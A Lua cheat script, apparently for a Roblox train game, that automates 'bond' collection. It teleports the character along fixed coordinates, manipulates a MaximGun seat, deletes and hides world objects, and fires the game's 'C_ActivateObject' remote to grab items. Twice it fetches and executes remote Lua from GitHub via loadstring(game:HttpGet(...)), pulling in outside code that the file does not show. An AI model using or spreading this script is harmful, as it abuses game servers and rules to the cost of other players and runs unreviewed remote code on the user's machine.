local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer

local char = player.Character or player.CharacterAdded:Wait()
local hrp = char:WaitForChild("HumanoidRootPart")
local humanoid = char:FindFirstChildOfClass("Humanoid") or char:WaitForChild("Humanoid")

-- MaximGun TP logic based on user-provided (better) code
local maximGunTP = Vector3.new(57, -5, -9000)

local function destroyBookcases()
    local castle = workspace:FindFirstChild("VampireCastle")
    if castle then
        for _, descendant in ipairs(castle:GetDescendants()) do
            if descendant:IsA("Model") and descendant.Name == "Bookcase" then
                descendant:Destroy()
            end
        end
    end
end

local function getMaximGunSeat()
    destroyBookcases()
    local runtime = workspace:FindFirstChild("RuntimeItems")
    if not runtime then return nil end
    for _, gun in ipairs(runtime:GetChildren()) do
        if gun.Name == "MaximGun" then
            local seat = gun:FindFirstChildWhichIsA("VehicleSeat")
            if seat then return seat end
        end
    end
    return nil
end

local function sitAndJumpOutSeat(seat)
    local jumped = false
    while true do
        if humanoid.SeatPart ~= seat then
            hrp.CFrame = seat.CFrame
            task.wait(0.1)
        else
            local weld = seat:FindFirstChild("SeatWeld")
            if weld and weld.Part1 and weld.Part1:IsDescendantOf(player.Character) then
                if not jumped then
                    humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                    task.wait(0.15)
                    hrp.CFrame = seat.CFrame
                    jumped = true
                else
                    break
                end
            end
        end
    end
end

-- Positions to visit for bond collection
local positions = {
    Vector3.new(57, 3, 30000), Vector3.new(57, 3, 28000),
    Vector3.new(57, 3, 26000), Vector3.new(57, 3, 24000),
    Vector3.new(57, 3, 22000), Vector3.new(57, 3, 20000),
    Vector3.new(57, 3, 18000), Vector3.new(57, 3, 16000),
    Vector3.new(57, 3, 14000), Vector3.new(57, 3, 12000),
    Vector3.new(57, 3, 10000), Vector3.new(57, 3, 8000),
    Vector3.new(57, 3, 6000), Vector3.new(57, 3, 4000),
    Vector3.new(57, 3, 2000), Vector3.new(57, 3, 0),
    Vector3.new(57, 3, -2000), Vector3.new(57, 3, -4000),
    Vector3.new(57, 3, -6000), Vector3.new(57, 3, -8000),
    Vector3.new(57, 3, -10000), Vector3.new(57, 3, -12000),
    Vector3.new(57, 3, -14000), Vector3.new(57, 3, -16000),
    Vector3.new(57, 3, -18000), Vector3.new(57, 3, -20000),
    Vector3.new(57, 3, -22000), Vector3.new(57, 3, -24000),
    Vector3.new(57, 3, -26000), Vector3.new(57, 3, -28000),
    Vector3.new(57, 3, -30000), Vector3.new(57, 3, -32000),
    Vector3.new(57, 3, -34000), Vector3.new(57, 3, -36000),
    Vector3.new(57, 3, -38000), Vector3.new(57, 3, -40000),
    Vector3.new(57, 3, -42000), Vector3.new(57, 3, -44000),
    Vector3.new(57, 3, -46000), Vector3.new(57, 3, -48000),
    Vector3.new(-434, 3, -48998)
}

local WaitTime = 0.9

local function TPTo(position)
    pcall(function()
        hrp.CFrame = CFrame.new(position)
    end)
end

-- Hide visuals code (only starts after 3rd position)
local runtimeItems = workspace:FindFirstChild("RuntimeItems")
local updateInterval = 1
local function isInRuntimeItems(instance)
    if not runtimeItems then return false end
    return instance:IsDescendantOf(runtimeItems)
end
local function hideVisuals(instance)
    if isInRuntimeItems(instance) then return end
    if instance:IsA("BasePart") then
        instance.LocalTransparencyModifier = 1
        instance.CanCollide = false
    elseif instance:IsA("Decal") or instance:IsA("Texture") then
        instance.Transparency = 1
    elseif instance:IsA("Beam") or instance:IsA("Trail") then
        instance.Enabled = false
    end
end
local function startHideLoop()
    task.spawn(function()
        while true do
            for _, instance in ipairs(workspace:GetDescendants()) do
                hideVisuals(instance)
            end
            task.wait(updateInterval)
        end
    end)
end

-- MaximGun routine
task.spawn(function()
    -- TP to MaximGun and get seat using improved logic
    while true do
        hrp.CFrame = CFrame.new(maximGunTP)
        task.wait(0.5)
        local seat = getMaximGunSeat()
        if seat then
            seat.Disabled = false
            sitAndJumpOutSeat(seat)
            break
        end
        task.wait(1)
    end

    for i, pos in ipairs(positions) do
        TPTo(pos)
        task.wait(WaitTime)

        if i == 2 then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/ringtaa/fly.github.io/refs/heads/main/fly.lua"))()
        end
        if i == 3 then
            startHideLoop()
        end

        -- Bond collection (don't move to next position until all are gone)
        while true do
            local foundAny = false
            local bonds = workspace:FindFirstChild("RuntimeItems") and workspace.RuntimeItems:GetChildren() or {}
            for _, bond in ipairs(bonds) do
                if bond:IsA("Model") and bond.PrimaryPart and (bond.Name == "Bond" or bond.Name == "Bonds") then
                    local bondPos = bond.PrimaryPart.Position
                    local dist = (bondPos - hrp.Position).Magnitude
                    if dist < 15 then
                        ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Network"):WaitForChild("RemotePromise"):WaitForChild("Remotes"):WaitForChild("C_ActivateObject"):FireServer(bond)
                        foundAny = true
                    else
                        TPTo(bondPos - Vector3.new(0, 5, 0))
                        local startTime = tick()
                        while tick() - startTime < 5 do
                            if not bond.Parent or not bond:IsDescendantOf(workspace.RuntimeItems) then
                                break
                            end
                            task.wait(0.1)
                        end
                        TPTo(pos)
                        foundAny = true
                    end
                end
            end
            if not foundAny then break end
            task.wait(0.2)
        end

        if pos == Vector3.new(-434, 3, -48998) then
            task.wait(6)
            loadstring(game:HttpGet("https://raw.githubusercontent.com/ewewe514/lowserver.github.io/refs/heads/main/lowserver.lua"))()
        end
    end
end)
